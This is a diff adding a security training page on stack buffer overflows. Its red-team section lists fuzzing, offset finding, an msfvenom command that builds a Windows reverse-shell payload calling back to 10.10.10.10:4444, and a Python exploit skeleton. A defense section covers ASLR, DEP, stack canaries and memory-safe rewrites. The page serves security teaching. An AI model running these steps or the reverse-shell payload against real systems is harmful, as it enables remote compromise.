@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lab: Buffer Overflow - Zero Trust</title>
+  <link rel="stylesheet" href="../../../css/style.css">
+</head>
+<body>
+  <header style="padding: 4rem 1rem;">
+    <div class="nav-bar">
+        <a href="../../../index.html">Home</a>
+        <a href="../../../tools.html">Tools</a>
+        <a href="../../../policy.html">Policy</a>
+        <a href="../../../processes.html">Processes</a>
+    </div>
+    <h1>Memory Safety: Stack Buffer Overflow</h1>
+    <p>MITRE T1190: Exploiting application vulnerability for Remote Code Execution (RCE).</p>
+  </header>
+
+  <main>
+    <div class="resource-category">
+        <h2 class="wiki-section-title">⚔️ The Attack (Red Team)</h2>
+        <p><strong>Concept:</strong> Overwriting the Return Address (EIP) to redirect execution flow to our shellcode.</p>
+        
+        <div class="tool-flags">
+<strong># 1. Fuzzing</strong>
+Use Python to send 'A' * 2000 to find the crash point.
+
+<strong># 2. Offset Calculation</strong>
+Use 'msf-pattern_create -l 2000' to find exact EIP overwrite.
+
+<strong># 3. Shellcode Generation</strong>
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -b "\x00" -f c
+
+<strong># 4. Exploit (Python)</strong>
+padding = "A" * offset
+eip = struct.pack("&lt;I", jmp_esp_address)
+nop_sled = "\x90" * 32
+payload = padding + eip + nop_sled + shellcode
+        </div>
+    </div>
+
+    <div class="resource-category">
+        <h2 class="wiki-section-title">🛡️ The Defense (Zero Trust)</h2>
+        <p>Why do we still have overflows? Because legacy C/C++ code allows direct memory access. Zero Trust demands <strong>Secure by Design</strong>.</p>
+        
+        <div class="grid-container">
+            <section>
+                <h3>Technical Controls</h3>
+                <ul>
+                    <li><strong>ASLR (Address Space Layout Randomization):</strong> Randomizes memory locations, making reliable jumps hard.</li>
+                    <li><strong>DEP (Data Execution Prevention):</strong> Mark the stack as non-executable (NX bit).</li>
+                    <li><strong>Stack Canaries:</strong> Place a random value on the stack; if modified, crash safely.</li>
+                </ul>
+            </section>
+            <section>
+                <h3>Architectural Shift</h3>
+                <p><strong>Rewrite in Rust/Go:</strong> Use memory-safe languages that manage pointers automatically.</p>
+                <p><strong>Input Validation:</strong> Never trust user input length. Use strict bounds checking.</p>
+            </section>
+        </div>
+    </div>
+  </main>
+
+  <footer>
+    <p>&copy; Zero Trust Knowledge Base.</p>
+  </footer>
+</body>
+</html>
